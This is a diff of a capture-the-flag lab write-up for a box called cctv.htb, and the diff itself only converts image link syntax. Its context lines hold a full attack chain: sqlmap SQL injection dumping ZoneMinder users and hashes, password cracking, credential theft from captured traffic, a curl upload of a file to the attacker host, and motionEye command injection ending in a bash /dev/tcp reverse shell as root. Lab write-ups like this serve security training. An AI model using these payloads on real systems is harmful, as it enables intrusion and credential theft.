@@ -21,14 +21,14 @@ So this seems like our classic http + ssh combo, we should start looking at the 
 
 ### Web Reconnaissance
 
-When viewing the website we are presented with the following screen - ![[Pasted image 20260316105327.png]]
+When viewing the website we are presented with the following screen - ![](Screenshots/Pasted%20image%2020260316105327.png)
 
 We find a couple of emails while hunting around:
 
 - info@cctv.htb
 - info@securevision.com
 
-At /zm there is a login page which is seemingly "ZoneMinder". ![[Pasted image 20260316105837.png]]
+At /zm there is a login page which is seemingly "ZoneMinder". ![](Screenshots/Pasted%20image%2020260316105837.png)
 
 Searching online, ZoneMinder seems to be an open source bit of software to manage cameras.
 
@@ -48,11 +48,11 @@ feroxbuster --url http://cctv.htb/ -C
 
 The scan doesn't finish but reaches a point of saturation, with nothing new returned.
 
-![[Pasted image 20260316110457.png]]
+![](Screenshots/Pasted%20image%2020260316110457.png)
 
 Interestingly, this flags a few paths in the /zm directory that might be interesting. However, when navigating to one, for example http://cctv.htb/zm/api/app/Config we get an error page leaking some of the software used.
 
-![[Pasted image 20260316110604.png]]
+![](Screenshots/Pasted%20image%2020260316110604.png)
 
 CakePHP 2.10.24
 
@@ -68,7 +68,7 @@ _Note any discovered subdomains and what they reveal._
 
 My last bit of enumeration on any bit of "off-the-shelf" software tends to be to search for any default credentials. In this case it was found to be admin / admin, which logs us into the site.
 
-![[Pasted image 20260316111313.png]]
+![](Screenshots/Pasted%20image%2020260316111313.png)
 
 ---
 
@@ -76,7 +76,7 @@ My last bit of enumeration on any bit of "off-the-shelf" software tends to be to
 
 After logging into the site as admin, we can explore the site a bit. In the options section, there appears to be a tab named Versions, leaking the version of ZoneMinder in use - 1.37.63
 
-![[Pasted image 20260316115813.png]]
+![](Screenshots/Pasted%20image%2020260316115813.png)
 
 Searching online, this seems to be vulnerable to SQL injection as described in **CVE-2024-51428**.
 
@@ -94,7 +94,7 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
     -p tid --dbms=mysql --batch
 ```
 
-This finds a payload that can successfully exploit a time-based blind SQLi. ![[Pasted image 20260316140253.png]]
+This finds a payload that can successfully exploit a time-based blind SQLi. ![](Screenshots/Pasted%20image%2020260316140253.png)
 
 Following the steps in the CVE, we can then dump the usernames from the db:
 
@@ -104,7 +104,7 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
     -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump
 ```
 
-![[Pasted image 20260316140629.png]]
+![](Screenshots/Pasted%20image%2020260316140629.png)
 
 This returns 3 users:
 
@@ -120,7 +120,7 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
     -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
 ```
 
-This returns a bcrypt hash. ![[Pasted image 20260316142245.png]]
+This returns a bcrypt hash. ![](Screenshots/Pasted%20image%2020260316142245.png)
 
 ---
 
@@ -137,7 +137,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 john --show hash.txt
 ```
 
-![[Pasted image 20260316141120.png]]
+![](Screenshots/Pasted%20image%2020260316141120.png)
 
 This drops mark's password as `opensesame`
 
@@ -149,7 +149,7 @@ Now we have the username and password combination we should attempt to use these
 ssh mark@cctv.htb
 ```
 
-![[Pasted image 20260316141214.png]]
+![](Screenshots/Pasted%20image%2020260316141214.png)
 
 And this works, but there is no user flag to be found.
 
@@ -159,7 +159,7 @@ And this works, but there is no user flag to be found.
 
 Looking around on the box, we have two home directories - mark (which we can access) and sa_mark (which we cannot.)
 
-Mark cannot run sudo and sa_mark exists in the /etc/passwd as a separate user: ![[Pasted image 20260316141503.png]]
+Mark cannot run sudo and sa_mark exists in the /etc/passwd as a separate user: ![](Screenshots/Pasted%20image%2020260316141503.png)
 
 I attempt to run
 
@@ -169,9 +169,9 @@ su sa_mark
 
 With the same password as for mark, however this doesn't work.
 
-In /opt/video/backup I find an interesting file - server.log which seems to suggest sa_mark has been authenticating to something: ![[Pasted image 20260316141731.png]]
+In /opt/video/backup I find an interesting file - server.log which seems to suggest sa_mark has been authenticating to something: ![](Screenshots/Pasted%20image%2020260316141731.png)
 
-Looking at the running services, there seems to be some interesting internal services, potentially web sites: ![[Pasted image 20260316142138.png]]
+Looking at the running services, there seems to be some interesting internal services, potentially web sites: ![](Screenshots/Pasted%20image%2020260316142138.png)
 
 To properly view these, I am going to use chisel, allowing us to access internal services from our attacker host.
 
@@ -212,11 +212,11 @@ I then took this pcap off the target machine to my attacker machine for further 
 
 ### Analysing the Traffic
 
-To analyse the traffic I am using wireshark. I open the pcap as shown: ![[Pasted image 20260316144831.png]]
+To analyse the traffic I am using wireshark. I open the pcap as shown: ![](Screenshots/Pasted%20image%2020260316144831.png)
 
-I start hunting through the tcp streams and find an interesting looking one, with what seems to be a username and password: ![[Pasted image 20260316154149.png]]
+I start hunting through the tcp streams and find an interesting looking one, with what seems to be a username and password: ![](Screenshots/Pasted%20image%2020260316154149.png)
 
-Rebuilding the stream gets the following: ![[Pasted image 20260316154214.png]]
+Rebuilding the stream gets the following: ![](Screenshots/Pasted%20image%2020260316154214.png)
 
 Getting sa_mark password as `X1l9fx1ZjS7RZb`
 
@@ -228,7 +228,7 @@ We can now use this password to impersonate sa_mark
 su sa_mark
 ```
 
-And we can grab the user flag: ![[Pasted image 20260316155126.png]]
+And we can grab the user flag: ![](Screenshots/Pasted%20image%2020260316155126.png)
 
 ---
 
@@ -240,7 +240,7 @@ In sa_mark's home directory there is an interesting pdf, I send this to my attac
 curl 10.10.14.2:8000/upload -X POST -F "files=@SecureVision Staff Announcement.pdf"
 ```
 
-![[Pasted image 20260316155613.png]]
+![](Screenshots/Pasted%20image%2020260316155613.png)
 
 This PDF appears to be implying there might be some internal "old" CCTV platform that we can login to using the same credentials.
 
@@ -252,15 +252,15 @@ At this stage I figure i need the port forwarding to work properly so I can acce
 
 allows us to access this service.
 
-When visiting this site we are presented with an old looking login screen for a bit of software called motioneye: ![[Pasted image 20260317091359.png]]
+When visiting this site we are presented with an old looking login screen for a bit of software called motioneye: ![](Screenshots/Pasted%20image%2020260317091359.png)
 
 Trying the same credentials as found previously don't work for either the mark or sa_mark user.
 
-Seemingly we are missing some credentials, so I went back to the file system and did some hunting. I eventually found an interesting folder /etc/motioneye with some credentials inside: ![[Pasted image 20260317094147.png]]
+Seemingly we are missing some credentials, so I went back to the file system and did some hunting. I eventually found an interesting folder /etc/motioneye with some credentials inside: ![](Screenshots/Pasted%20image%2020260317094147.png)
 
-Trying this username and password combo logs us in: admin : 989c5a8ee87a0e9521ec81a79187d162109282f0 ![[Pasted image 20260317094255.png]]
+Trying this username and password combo logs us in: admin : 989c5a8ee87a0e9521ec81a79187d162109282f0 ![](Screenshots/Pasted%20image%2020260317094255.png)
 
-In this page we can see some version numbers in the general settings: ![[Pasted image 20260317094413.png]]
+In this page we can see some version numbers in the general settings: ![](Screenshots/Pasted%20image%2020260317094413.png)
 
 ---
 
@@ -286,9 +286,9 @@ Then I spin up a listener and enter the payload into the image file name field i
 $(curl 10.10.14.2:8000).%Y-%m-%d-%H-%M-%S
 ```
 
-![[Pasted image 20260317095552.png]]
+![](Screenshots/Pasted%20image%2020260317095552.png)
 
-Then when we click the screenshot button, we trigger the execution and get a callback on my host: ![[Pasted image 20260317095530.png]]
+Then when we click the screenshot button, we trigger the execution and get a callback on my host: ![](Screenshots/Pasted%20image%2020260317095530.png)
 
 Modifying our payload to be a reverse shell as follows:
 
@@ -296,7 +296,7 @@ Modifying our payload to be a reverse shell as follows:
 $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
 ```
 
-Again, hitting the screenshot button, we now get a shell in our listener as root, and we can grab the root flag: ![[Pasted image 20260317095811.png]]
+Again, hitting the screenshot button, we now get a shell in our listener as root, and we can grab the root flag: ![](Screenshots/Pasted%20image%2020260317095811.png)
 
 ---
 
